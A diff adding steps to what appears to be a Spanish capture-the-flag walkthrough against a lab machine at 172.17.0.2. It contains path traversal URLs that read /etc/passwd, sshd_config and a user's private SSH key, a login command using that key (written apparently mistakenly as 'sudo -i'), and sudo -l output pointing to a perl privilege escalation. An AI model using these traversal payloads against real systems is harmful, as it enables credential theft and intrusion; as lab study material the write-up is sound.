@@ -48,6 +48,18 @@ El -fs se saca se haber hecho primero un ffuf sin filtro, y ver que el número 2
 
 http://172.17.0.2/?secret=../../../../etc/ssh/sshd_config
 http://172.17.0.2/?secret=../../../../etc/passwd
+http://172.17.0.2/index.php?secret=../../../../../../home/vaxei/.ssh/id_rsa
+
+sudo -i id_rsa vaxei@172.17.0.2
+
+vaxei@00a5941544de:~$ sudo -l
+Matching Defaults entries for vaxei on 00a5941544de:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User vaxei may run the following commands on 00a5941544de:
+    (luisillo) NOPASSWD: /usr/bin/perl
+
+https://www.youtube.com/watch?v=ux326VPrEpo
 
 
 
